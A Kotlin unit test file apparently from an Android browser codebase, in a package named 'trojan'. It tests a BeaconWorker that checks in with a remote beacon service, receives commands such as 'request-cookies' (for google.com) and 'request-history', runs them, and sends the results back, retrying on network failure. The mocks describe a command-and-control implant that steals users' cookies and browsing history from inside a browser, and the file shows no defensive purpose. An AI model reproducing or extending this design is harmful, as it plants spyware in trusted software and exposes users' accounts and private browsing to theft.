package com.duckduckgo.trojan.impl

import android.content.Context
import androidx.work.ListenableWorker.Result
import androidx.work.WorkManager
import androidx.work.testing.TestListenableWorkerBuilder
import com.duckduckgo.common.test.CoroutineTestRule
import com.duckduckgo.trojan.api.BeaconService
import com.duckduckgo.trojan.api.CheckInResult
import com.duckduckgo.trojan.api.PendingCommand
import kotlinx.coroutines.test.runTest
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.MatcherAssert.assertThat
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.kotlin.any
import org.mockito.kotlin.eq
import org.mockito.kotlin.mock
import org.mockito.kotlin.never
import org.mockito.kotlin.verify
import org.mockito.kotlin.whenever
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class BeaconWorkerTest {

    @get:Rule
    val coroutineRule = CoroutineTestRule()

    private val mockBeaconService: BeaconService = mock()
    private val mockCommandHandler: CommandHandler = mock()
    private val mockWorkManager: WorkManager = mock()
    private lateinit var context: Context

    @Before
    fun setUp() {
        context = RuntimeEnvironment.getApplication()
    }

    // -----------------------------------------------------------------------
    // doWork() — success scenarios
    // -----------------------------------------------------------------------

    @Test
    fun whenNoTasksPendingThenReturnsSuccess() = runTest {
        whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(emptyList(), 15))

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.success()))
    }

    @Test
    fun whenTasksExistThenExecutesAllAndReturnsSuccess() = runTest {
        val tasks = listOf(
            PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap()),
            PendingCommand(id = "t2", type = "request-history", payload = emptyMap()),
        )
        whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(tasks, 15))
        whenever(mockCommandHandler.execute(any())).thenReturn("some result")

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.success()))
    }

    @Test
    fun whenTasksExistThenDelegatesToCommandHandler() = runTest {
        val cmd = PendingCommand(id = "t1", type = "request-cookies", payload = mapOf("domains" to "google.com"))
        whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(listOf(cmd), 15))
        whenever(mockCommandHandler.execute(any())).thenReturn("cookies data")

        val worker = createWorker()
        worker.doWork()

        verify(mockCommandHandler).execute(eq(cmd))
    }

    @Test
    fun whenTasksExistThenSendsResultForEachTask() = runTest {
        val tasks = listOf(
            PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap()),
            PendingCommand(id = "t2", type = "request-history", payload = emptyMap()),
        )
        whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(tasks, 15))
        whenever(mockCommandHandler.execute(any())).thenReturn("result data")

        val worker = createWorker()
        worker.doWork()

        verify(mockBeaconService).sendResult(eq("t1"), eq("request-cookies"), any(), any())
        verify(mockBeaconService).sendResult(eq("t2"), eq("request-history"), any(), any())
    }

    @Test
    fun whenTasksExistThenPassesProtocolFromCheckIn() = runTest {
        val cmd = PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap())
        whenever(mockBeaconService.checkIn()).thenReturn(
            CheckInResult(listOf(cmd), 15, communicationProtocol = "https")
        )
        whenever(mockCommandHandler.execute(any())).thenReturn("data")

        val worker = createWorker()
        worker.doWork()

        verify(mockBeaconService).sendResult(any(), any(), any(), eq("https"))
    }

    // -----------------------------------------------------------------------
    // doWork() — failure scenarios
    // -----------------------------------------------------------------------

    @Test
    fun whenCheckInFailsThenReturnsRetry() = runTest {
        whenever(mockBeaconService.checkIn()).thenThrow(RuntimeException("Network error"))

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.retry()))
    }

    @Test
    fun whenSendResultFailsThenReturnsRetry() = runTest {
        val tasks = listOf(
            PendingCommand(id = "t1", type = "request-cookies", payload = emptyMap()),
        )
        whenever(mockBeaconService.checkIn()).thenReturn(CheckInResult(tasks, 15))
        whenever(mockCommandHandler.execute(any())).thenReturn("data")
        whenever(mockBeaconService.sendResult(any(), any(), any(), any()))
            .thenThrow(RuntimeException("Network error"))

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.retry()))
    }

    @Test
    fun whenCheckInFailsThenNoResultsAreSent() = runTest {
        whenever(mockBeaconService.checkIn()).thenThrow(RuntimeException("Network error"))

        val worker = createWorker()
        worker.doWork()

        verify(mockBeaconService, never()).sendResult(any(), any(), any(), any())
        verify(mockCommandHandler, never()).execute(any())
    }

    // -----------------------------------------------------------------------
    // Helper
    // -----------------------------------------------------------------------

    private fun createWorker(): BeaconWorker {
        val worker = TestListenableWorkerBuilder<BeaconWorker>(context).build()
        worker.beaconService = mockBeaconService
        worker.commandHandler = mockCommandHandler
        worker.workManager = mockWorkManager
        return worker
    }
}
